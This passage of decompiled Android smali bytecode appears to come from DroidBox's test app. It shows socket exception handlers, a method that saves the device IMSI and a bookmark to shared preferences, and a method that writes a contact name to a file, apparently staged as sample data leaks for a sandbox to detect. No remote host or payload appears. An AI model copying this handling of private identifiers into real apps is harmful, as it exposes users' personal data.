    #v5=(Reference);
    goto :goto_1

    .end local v2           #dataOutputStream:Ljava/io/DataOutputStream;
    .end local v5           #socket:Ljava/net/Socket;
    .restart local v3       #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v6       #socket:Ljava/net/Socket;
    :catch_6
    #v1=(Conflicted);v3=(Reference);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    #v4=(Reference);
    move-object v2, v3

    .end local v3           #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v2       #dataOutputStream:Ljava/io/DataOutputStream;
    #v2=(Reference);
    move-object v5, v6

    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
    #v5=(Reference);
    goto :goto_1

    .end local v0           #dataInputStream:Ljava/io/DataInputStream;
    .end local v2           #dataOutputStream:Ljava/io/DataOutputStream;
    .end local v5           #socket:Ljava/net/Socket;
    .restart local v1       #dataInputStream:Ljava/io/DataInputStream;
    .restart local v3       #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v6       #socket:Ljava/net/Socket;
    :catch_7
    #v1=(Reference);v2=(Null);v4=(Uninit);v5=(Null);
    move-exception v9

    move-object v4, v9

    #v4=(Reference);
    move-object v0, v1

    .end local v1           #dataInputStream:Ljava/io/DataInputStream;
    .restart local v0       #dataInputStream:Ljava/io/DataInputStream;
    #v0=(Reference);
    move-object v2, v3

    .end local v3           #dataOutputStream:Ljava/io/DataOutputStream;
    .restart local v2       #dataOutputStream:Ljava/io/DataOutputStream;
    #v2=(Reference);
    move-object v5, v6

    .end local v6           #socket:Ljava/net/Socket;
    .restart local v5       #socket:Ljava/net/Socket;
    #v5=(Reference);
    goto :goto_1
.end method

.method public testSharedPreferences()V
    .locals 4

    .prologue
    .line 223
    const-string v2, "Test"

    #v2=(Reference);
    const-string v3, "[*] testSharedPreferences()"

    #v3=(Reference);
    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 224
    const-string v2, "Prefs"

    const/4 v3, 0x1

    #v3=(One);
    invoke-virtual {p0, v2, v3}, Ldroidbox/tests/DroidBoxTests;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v1

    .line 225
    .local v1, settings:Landroid/content/SharedPreferences;
    #v1=(Reference);
    invoke-interface {v1}, Landroid/content/SharedPreferences;->edit()Landroid/content/SharedPreferences$Editor;

    move-result-object v0

    .line 226
    .local v0, editor:Landroid/content/SharedPreferences$Editor;
    #v0=(Reference);
    const-string v2, "SharedValue"

    iget-object v3, p0, Ldroidbox/tests/DroidBoxTests;->imsi:Ljava/lang/String;

    #v3=(Reference);
    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 227
    const-string v2, "Book"

    iget-object v3, p0, Ldroidbox/tests/DroidBoxTests;->bookmark:Ljava/lang/String;

    invoke-interface {v0, v2, v3}, Landroid/content/SharedPreferences$Editor;->putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;

    .line 228
    invoke-interface {v0}, Landroid/content/SharedPreferences$Editor;->commit()Z

    .line 229
    return-void
.end method

.method public testWriteFile()V
    .locals 4

    .prologue
    .line 258
    const-string v2, "Test"

    #v2=(Reference);
    const-string v3, "[*] testWriteFile()"

    #v3=(Reference);
    invoke-static {v2, v3}, Landroid/util/Log;->v(Ljava/lang/String;Ljava/lang/String;)I

    .line 260
    :try_start_0
    new-instance v1, Ljava/io/OutputStreamWriter;

    #v1=(UninitRef);
    const-string v2, "myfilename.txt"

    const/4 v3, 0x0

    #v3=(Null);
    invoke-virtual {p0, v2, v3}, Ldroidbox/tests/DroidBoxTests;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 261
    .local v1, out:Ljava/io/OutputStreamWriter;
    #v1=(Reference);
    const-string v2, "Write a line\n"

    invoke-virtual {v1, v2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 262
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->close()V

    .line 264
    new-instance v1, Ljava/io/OutputStreamWriter;

    .end local v1           #out:Ljava/io/OutputStreamWriter;
    #v1=(UninitRef);
    const-string v2, "output.txt"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Ldroidbox/tests/DroidBoxTests;->openFileOutput(Ljava/lang/String;I)Ljava/io/FileOutputStream;

    move-result-object v2

    invoke-direct {v1, v2}, Ljava/io/OutputStreamWriter;-><init>(Ljava/io/OutputStream;)V

    .line 265
    .restart local v1       #out:Ljava/io/OutputStreamWriter;
    #v1=(Reference);
    new-instance v2, Ljava/lang/StringBuilder;

    #v2=(UninitRef);
    iget-object v3, p0, Ldroidbox/tests/DroidBoxTests;->contactName:Ljava/lang/String;

    #v3=(Reference);
    invoke-static {v3}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v3

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    #v2=(Reference);
    const-string v3, "\n"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/io/OutputStreamWriter;->write(Ljava/lang/String;)V

    .line 266
    invoke-virtual {v1}, Ljava/io/OutputStreamWriter;->close()V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 270
    .end local v1           #out:Ljava/io/OutputStreamWriter;
    :goto_0
    #v0=(Conflicted);v1=(Conflicted);
    return-void

    .line 267
    :catch_0
    #v0=(Uninit);v2=(Conflicted);
    move-exception v2

    #v2=(Reference);
    move-object v0, v2

    .line 268
    .local v0, e:Ljava/io/IOException;
    #v0=(Reference);
    invoke-virtual {v0}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_0
.end method

*/}
